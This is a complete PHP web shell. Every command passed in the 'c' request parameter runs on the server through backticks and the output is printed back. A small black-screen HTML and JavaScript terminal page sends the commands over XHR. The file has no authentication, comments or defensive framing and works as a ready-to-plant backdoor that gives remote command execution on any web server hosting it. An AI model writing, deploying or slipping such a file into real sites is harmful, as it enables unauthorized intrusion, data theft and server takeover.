<?php

$c= isset($_REQUEST['c']) ? $_REQUEST['c'] : '';

if ($c) {
    header("content-type: text/plain");
    echo "\$ $c\n";
    echo `$c 2>&1`;
    die();
}

header("content-type: text/html");

?>
<!doctype html>
<html>
<head>
<title>shell</title>
<script type="text/javascript">
function onResponse(xhr) {
    if (xhr.readyState == 4) {
        // Response status is OK
        if (xhr.status != 200) {
            alert('Error response status: ' + xhr.status);
            return;
        } else {
            var output = document.getElementById('output');
            output.outerHTML = "<pre id='output'>" + output.innerHTML + "\n" + xhr.responseText + "</pre>";
            window.scrollTo(0, document.body.scrollHeight);
        }
    }
}

function send(form) {
    var c = form.c.value;
    if (!c) {
        return false;
    }
    window.xhr.open('POST', document.URL, true);
    window.xhr.onreadystatechange = function() {onResponse(window.xhr);};
    window.xhr.setRequestHeader("CONTENT-TYPE","application/x-www-form-urlencoded");
    window.xhr.send('c=' + encodeURIComponent(c) + '&r=' + Math.random());
    //form.c.value = '';
    form.c.select();
    return false;
}

window.onload = function() {
    if(!window.XMLHttpRequest) {
        window.XMLHttpRequest = function() {return new ActiveXObject('Msxml2.XMLHTTP');};
    }
    window.xhr = new XMLHttpRequest();
    window.output = document.getElementById('output');
}

</script>
<style>
* {font-family:'Courier New'; font-size:12px }
body { background: black; color: #CCC;}
</style>
</head>
<body>
<pre id="output"></pre>
<form method="post" onsubmit="return send(this)">
<input type="text" name="c" />
<input type="submit" value="run" />
<input type="button" value="clear" onclick="output.innerHTML = ''" />
</form>
</body>
</html>